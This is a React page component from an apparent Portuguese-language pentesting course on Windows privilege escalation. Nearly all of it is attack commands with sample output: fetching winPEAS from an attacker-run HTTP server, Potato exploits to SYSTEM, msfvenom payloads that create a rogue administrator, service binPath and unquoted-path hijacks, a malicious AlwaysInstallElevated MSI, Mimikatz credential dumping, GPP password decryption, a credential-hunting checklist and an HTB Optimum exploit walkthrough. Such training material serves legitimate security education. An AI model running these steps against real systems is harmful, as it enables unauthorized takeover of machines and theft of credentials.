import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PrivescWindows() {
  return (
    <PageContainer
      title="PrivEsc — Escalação de privilégio (Windows)"
      subtitle="De usuário comum (ou serviço) para SYSTEM/Administrator: tokens, services, registry, AlwaysInstallElevated."
      difficulty="intermediario"
      timeToRead="22 min"
    >
      <h2>Recon obrigatório</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Users\\user"
        lines={[
          {
            cmd: "whoami /all",
            out: `USER INFORMATION
----------------
User Name        SID
================ ==============================================
WIN-TARGET\\user  S-1-5-21-1234567890-987654321-1122334455-1001

GROUP INFORMATION
-----------------
Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Mandatory Label\\Medium Mandatory Level     Label            S-1-16-8192
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default
BUILTIN\\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= =============================== ========
SeShutdownPrivilege           Shut down the system            Disabled
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeUndockPrivilege             Remove computer from docking    Disabled
SeImpersonatePrivilege        Impersonate a client            Enabled  ← JOGO!
SeCreateGlobalPrivilege       Create global objects           Enabled`,
            outType: "warning",
          },
          {
            cmd: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
            out: `OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC`,
            outType: "info",
          },
        ]}
      />

      <h2>Automação — winPEAS / PowerUp</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            comment: "do atacante: webserver",
            cmd: "(local) python3 -m http.server 8000",
            out: "Serving HTTP on 0.0.0.0 port 8000 ...",
            outType: "muted",
          },
          {
            cmd: "powershell -c \"iwr -Uri http://10.10.14.42:8000/winPEASx64.exe -Outfile winpeas.exe\"",
            out: "(silencioso = sucesso)",
            outType: "default",
          },
          {
            cmd: ".\\winpeas.exe quiet",
            out: `ÉÉÉÉÉÉÉÉÉÉÉ¹ Operating System
   Hostname: WIN-TARGET
   ProductName: Windows Server 2019 Standard
   InstallationType: Server
   EditionId: ServerStandard
   BuildLabEx: 17763.1.amd64fre.rs5_release.180914-1434

ÉÉÉÉÉÉÉÉÉÉÉ¹ User & Privileges
   Current user: WIN-TARGET\\user
   Current groups: BUILTIN\\Users
   [+] Token privileges:
       SeImpersonatePrivilege: Enabled    ← Potato attack possível!

ÉÉÉÉÉÉÉÉÉÉÉ¹ Services
   [+] Looking for service permissions...
   [!] BackupSvc has weak permissions:
       NT AUTHORITY\\Authenticated Users: ChangeConfig    ← privesc!

ÉÉÉÉÉÉÉÉÉÉÉ¹ Applications
   [!] AlwaysInstallElevated is enabled (HKLM and HKCU)  ← privesc trivial!`,
            outType: "warning",
          },
        ]}
      />

      <h2>Vetor 1 — SeImpersonatePrivilege (Potato attacks)</h2>
      <p>
        Se você está rodando como uma conta de serviço (IIS App Pool, MSSQL service) com{" "}
        <strong>SeImpersonate</strong>, você é praticamente SYSTEM.
      </p>

      <Terminal
        user="iis_user"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            cmd: "whoami /priv | findstr Impersonate",
            out: "SeImpersonatePrivilege   Impersonate a client after authentication   Enabled",
            outType: "warning",
          },
          {
            comment: "PrintSpoofer (mais usado em 2024)",
            cmd: ".\\PrintSpoofer.exe -i -c cmd",
            out: `[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4131]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system`,
            outType: "error",
          },
          {
            comment: "alternativas: GodPotato, RoguePotato, SweetPotato",
            cmd: ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
            out: `[*] CombaseModule: 0x7ff8b51f0000 
[*] DispatchTable: 0x7ff8b53d4860 
[*] UseProtSeqFunction: 0x7ff8b5269c10 
[*] UseProtSeqFunctionParamCount: 6 
[*] HookRPC 
[*] Start RPC server 
[*] CreateNamedPipe \\\\.\\pipe\\fc60d \\pipe\\srvsvc 
[*] DCOM obj GUID: {4991d34b-80a1-4291-83b6-3328366b9097} 
[*] DCOM obj OXID: 0xefcd95c5d7df0bf4 
[*] CoGetInstanceFromIStorage OK 
[+] PrincipalName: NT AUTHORITY\\SYSTEM 
[+] Token user name: NT AUTHORITY\\SYSTEM`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 2 — Service misconfiguration</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            comment: "listar serviços que VOCÊ pode modificar",
            cmd: "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula 2>nul",
            out: `RW BackupSvc
        SERVICE_ALL_ACCESS                           ← total!
RW LegacyService
        SERVICE_CHANGE_CONFIG                        ← pode modificar`,
            outType: "warning",
          },
          {
            cmd: "sc qc BackupSvc",
            out: `[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: BackupSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\\Program Files\\Backup\\backup.exe
        SERVICE_START_NAME : LocalSystem`,
            outType: "info",
          },
          {
            comment: "modificar binPath para nosso exe",
            cmd: "msfvenom -p windows/x64/exec CMD='net user pwn P@ssw0rd /add && net localgroup administrators pwn /add' -f exe -o C:\\Temp\\evil.exe",
            out: "Saved as: C:\\Temp\\evil.exe",
            outType: "muted",
          },
          {
            cmd: "sc config BackupSvc binPath= \"C:\\Temp\\evil.exe\"",
            out: "[SC] ChangeServiceConfig SUCCESS",
            outType: "default",
          },
          {
            cmd: "sc stop BackupSvc && sc start BackupSvc",
            out: "(serviço roda evil.exe como SYSTEM, cria usuário pwn:P@ssw0rd como Administrator)",
            outType: "error",
          },
          {
            cmd: "net user pwn",
            out: `User name                    pwn
Local Group Memberships      *Administrators       *Users`,
            outType: "warning",
          },
        ]}
      />

      <h2>Vetor 3 — Unquoted Service Path</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            cmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\\\\\" | findstr /i /v \\\"\\\"\\\"",
            out: `LegacyApp    LegacyApp Service    C:\\Program Files\\Legacy App\\service.exe   Auto`,
            outType: "warning",
          },
          {
            comment: "Windows tenta executar: C:\\Program.exe → C:\\Program Files\\Legacy.exe → ...",
            cmd: "icacls \"C:\\\"",
            out: `C:\\ Everyone:(OI)(CI)(F)
   ← writable!`,
            outType: "warning",
          },
          {
            cmd: "copy evil.exe \"C:\\Program Files\\Legacy.exe\"",
            out: "1 file(s) copied.",
            outType: "default",
          },
          {
            comment: "no próximo restart do serviço (ou reboot), evil.exe roda como SYSTEM",
            cmd: "(esperar) → evil.exe executa",
            out: "",
            outType: "muted",
          },
        ]}
      />

      <h2>Vetor 4 — AlwaysInstallElevated</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            out: `HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
    AlwaysInstallElevated    REG_DWORD    0x1                ← AMBOS = 1 → privesc!`,
            outType: "warning",
          },
          {
            cmd: "msfvenom -p windows/x64/exec CMD='net user pwn P@ssw0rd /add && net localgroup administrators pwn /add' -f msi -o evil.msi",
            out: "Saved as: evil.msi",
            outType: "muted",
          },
          {
            cmd: "msiexec /quiet /qn /i evil.msi",
            out: "(silencioso. msiexec roda como SYSTEM)",
            outType: "default",
          },
          {
            cmd: "net user pwn",
            out: `Local Group Memberships      *Administrators`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 5 — Token impersonation com Mimikatz</h2>
      <Terminal
        user="admin"
        host="WIN-TARGET"
        path="C:\\Temp"
        lines={[
          {
            cmd: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
            out: `mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 985731 (00000000:000f0a83)
Session           : Interactive from 1
User Name         : Administrator
Domain            : WIN-TARGET
Logon Server      : WIN-TARGET
Logon Time        : 03/04/2026 15:11:23
SID               : S-1-5-21-1234567890-987654321-1122334455-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WIN-TARGET
         * NTLM     : c1e07adc59f6c3eaa7a02e7a4e5f5cc1
         * SHA1     : 1c4d6824ca5b8d0876f5e88a1e3b3cd24a6b3251
        tspkg :
         * Username : Administrator
         * Domain   : WIN-TARGET
         * Password : P@ssw0rd!2024                        ← cleartext!`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 6 — Stored credentials</h2>
      <Terminal
        user="user"
        host="WIN-TARGET"
        path="C:\\Users\\user"
        lines={[
          {
            cmd: "cmdkey /list",
            out: `Currently stored credentials:

    Target: Domain:interactive=ACME\\admin
    Type: Domain Password
    User: ACME\\admin

    Target: LegacyGeneric:target=git:https://github.com
    Type: Generic
    User: PersonalAccessToken`,
            outType: "warning",
          },
          {
            comment: "usar a credencial sem saber a senha",
            cmd: "runas /savecred /user:ACME\\admin \"C:\\Temp\\evil.exe\"",
            out: "(roda evil.exe como ACME\\admin)",
            outType: "error",
          },
          {
            comment: "Group Policy Preferences (groups.xml com cpassword)",
            cmd: "findstr /S /I cpassword \\\\acme.local\\sysvol\\acme.local\\policies\\*.xml",
            out: `\\\\acme.local\\sysvol\\acme.local\\policies\\{...}\\Machine\\Preferences\\Groups\\Groups.xml:
<Properties cpassword="riBZpPL3..." userName="local_admin" />`,
            outType: "error",
          },
          {
            comment: "decoded com gpp-decrypt (publicamente conhecido)",
            cmd: "(no kali) gpp-decrypt 'riBZpPL3...'",
            out: "P@ssw0rd!Local",
            outType: "warning",
          },
        ]}
      />

      <CodeBlock
        language="powershell"
        title="checklist privesc Windows (memorize)"
        code={`# 1. Quem sou eu
whoami /all
whoami /priv
whoami /groups

# 2. Sistema
systeminfo
hostname
wmic qfe get hotfixid,installedon

# 3. Privileges (Potato)
whoami /priv | findstr "Impersonate"

# 4. Services exploitable
sc query state= all
accesschk.exe -uwcqv "Authenticated Users" *
wmic service get name,pathname,startmode | findstr /i "auto"

# 5. AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# 6. Stored creds
cmdkey /list
dir /s /b C:\\Users\\*.kdbx 2>nul
findstr /S /I "password" C:\\xampp\\*.conf C:\\inetpub\\*.config 2>nul
type C:\\unattend.xml 2>nul
type C:\\Windows\\Panther\\Unattend.xml 2>nul

# 7. Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "TaskName" /i "Run As"

# 8. Hotfixes faltando (kernel)
wmic qfe get hotfixid

# 9. Network
netstat -ano
arp -a
route print

# 10. Windows Defender / AV
sc query windefend
Get-MpComputerStatus`}
      />

      <PracticeBox
        title="VulnHub / HTB clássico — Optimum"
        goal="Praticar fluxo completo: exploit inicial → user → privesc → SYSTEM."
        steps={[
          "Faça scan + identifique Rejetto HFS 2.3 (CVE-2014-6287).",
          "Use exploit RCE → shell como user.",
          "Identifique versão do Windows (Server 2012).",
          "Use Watson/Sherlock para sugerir kernel exploit.",
          "MS16-098 (BugBounty exploit) → SYSTEM.",
        ]}
        command={`# 1) recon
nmap -sV -p- 10.10.10.8

# 2) exploit RCE
searchsploit Rejetto HFS
python2 39161.py 10.10.10.8 80
# → reverse shell como kostas

# 3) privesc — recon
systeminfo > sys.txt
.\\Watson.exe   # ou .\\windows-exploit-suggester.py

# 4) kernel exploit
.\\MS16-098.exe   # → SYSTEM`}
        expected={`(shell como Optimum\\kostas)
C:\\>whoami
optimum\\kostas

C:\\>.\\MS16-098.exe
[+] Privilege escalated to SYSTEM
NT AUTHORITY\\SYSTEM`}
        verify="cat C:\\Users\\Administrator\\Desktop\\root.txt — flag de root."
      />

      <AlertBox type="warning" title="LOLBAS é o equivalente do GTFOBins">
        <a href="https://lolbas-project.github.io" target="_blank" rel="noreferrer">lolbas-project.github.io</a>
        lista TODO binário Windows que pode ser abusado para download, execute, copy,
        compile, etc. Bypass de AppLocker, evasão de AV, persistence — tudo lá.
      </AlertBox>
    </PageContainer>
  );
}
